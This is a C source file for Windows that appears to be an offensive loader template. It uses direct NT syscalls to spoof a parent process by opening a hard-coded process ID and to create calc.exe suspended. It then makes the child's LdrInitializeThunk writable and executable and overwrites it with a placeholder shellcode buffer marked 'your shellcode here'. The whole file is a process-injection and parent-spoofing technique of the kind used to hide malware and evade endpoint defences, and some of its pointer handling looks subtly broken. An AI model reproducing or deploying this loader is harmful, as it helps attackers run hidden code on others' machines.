#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "structs.h"

int wmain()
{
	// Get handle on parent process
	ZwOpenProcess = &ZwOpenProcess10;
	ZwClose = &ZwClose10;

	HANDLE hParentProc = NULL;
	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID clientId = { 0 };
	
	clientId.UniqueProcess = (HANDLE)25764; //PPID
	clientId.UniqueThread = (HANDLE)0;

	ZwOpenProcess(&hParentProc, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
	wprintf(L"Parent process handle: %p\n", hParentProc);

	// Create child process
	NtCreateUserProcess = &NtCreateUserProcess10;
	UNICODE_STRING uImageName;
	WCHAR imageName[] = { L"\\??\\C:\\Windows\\System32\\calc.exe" };
	
	uImageName.Buffer = imageName;
	uImageName.Length = sizeof(imageName) - sizeof(UNICODE_NULL);
	uImageName.MaximumLength = sizeof(imageName);
	PUNICODE_STRING pProcessImageName = &uImageName;

	PS_CREATE_INFO procInfo;
	RTL_USER_PROCESS_PARAMETERS userParams;
	PS_ATTRIBUTE_LIST attrList;

	NTSTATUS status = 0x00000103;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	char data[2 * sizeof(ULONGLONG)] = { 'Y', 0x00, 0x3D, 0x00, 'Q', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	
	RtlSecureZeroMemory(&userParams, sizeof(RTL_USER_PROCESS_PARAMETERS));
	RtlSecureZeroMemory(&attrList, sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE));
	RtlSecureZeroMemory(&procInfo, sizeof(PS_CREATE_INFO));

	userParams.MaximumLength = sizeof(RTL_USER_PROCESS_PARAMETERS);
	userParams.Length = sizeof(RTL_USER_PROCESS_PARAMETERS);
	attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	procInfo.Size = sizeof(PS_CREATE_INFO);

	userParams.Environment = (WCHAR*)data;
	userParams.EnvironmentSize = sizeof(data);
	userParams.EnvironmentVersion = 0;
	userParams.Flags = RTL_USER_PROCESS_PARAMETERS_NORMALIZED;

	attrList.Attributes[0].Attribute = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE);
	attrList.Attributes[0].Size = pProcessImageName->Length;
	attrList.Attributes[0].Value = (ULONG_PTR)pProcessImageName->Buffer;

	attrList.Attributes[1].Attribute = PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE);
	attrList.Attributes[1].Size = sizeof(ULONG_PTR);
	attrList.Attributes[1].ValuePtr = hParentProc;
	
	status = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, &userParams, &procInfo, &attrList);
	wprintf(L"Child process handle: %p\n", hProcess);

	// your shellcode here...
	BYTE shellcode[] = { 0x00 };

	SIZE_T size = sizeof(shellcode);

	NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
	ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;

	void* moduleNtDll = GetModuleHandle("ntdll");
	void* ldrInitThunk = GetProcAddress(moduleNtDll, "LdrInitializeThunk");
	
	DWORD oldProtect = 0;
	status = ZwProtectVirtualMemory(hProcess, &ldrInitThunk, &size, PAGE_EXECUTE_READWRITE, &oldProtect);
	wprintf(L"ZwProtectVirtualMemory: %d\n", status);
	
	status = ZwWriteVirtualMemory(hProcess, &ldrInitThunk, &shellcode, size, NULL);
	wprintf(L"ZwWriteVirtualMemory: %d\n", status);

	return 0;
}
